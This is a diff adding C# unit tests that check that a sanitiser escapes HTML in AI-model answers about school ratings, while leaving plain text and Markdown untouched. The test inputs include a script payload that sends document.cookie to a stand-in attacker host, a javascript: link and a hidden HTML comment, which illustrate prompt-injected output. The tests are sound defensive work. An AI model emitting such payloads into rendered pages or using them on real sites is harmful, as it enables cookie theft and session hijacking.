@@ -30,4 +30,17 @@ public sealed class AnswerLinksTests
     [InlineData("Logo ![DfE](https://www.gov.uk/logo.png) on [GOV.UK](https://www.gov.uk).", "Logo DfE on [GOV.UK](https://www.gov.uk).")]   // links stay
     public void Images_AreRemoved_KeepingTheirAltText(string answer, string expected)
         => Assert.Equal(expected, AnswerLinks.Clean(answer));
+
+    [Theory]
+    // An app that renders answers as HTML (e.g. for citation links) would otherwise run whatever the model was tricked into writing.
+    [InlineData("Rated Good<script>fetch('https://attacker.example/?d='+document.cookie)</script>",
+        "Rated Good&lt;script>fetch('https://attacker.example/?d='+document.cookie)&lt;/script>")]
+    [InlineData("""See <a href="javascript:alert(1)">the report</a>.""", """See &lt;a href="javascript:alert(1)">the report&lt;/a>.""")]
+    [InlineData("Hidden <!-- instruction --> text", "Hidden &lt;!-- instruction --> text")]
+    [InlineData("<?xml version=\"1.0\"?>", "&lt;?xml version=\"1.0\"?>")]
+    // Not HTML, so unchanged: a "<" before a space or digit, and Markdown.
+    [InlineData("Attendance is < 90% and 3<5.", "Attendance is < 90% and 3<5.")]
+    [InlineData("Rated **Good** in [2024](https://www.gov.uk/ofsted).", "Rated **Good** in [2024](https://www.gov.uk/ofsted).")]
+    public void HtmlTheModelWrites_IsShownAsText_NotRun_AndTextThatIsntHtmlIsUnchanged(string answer, string expected)
+        => Assert.Equal(expected, AnswerLinks.Clean(answer));
 }
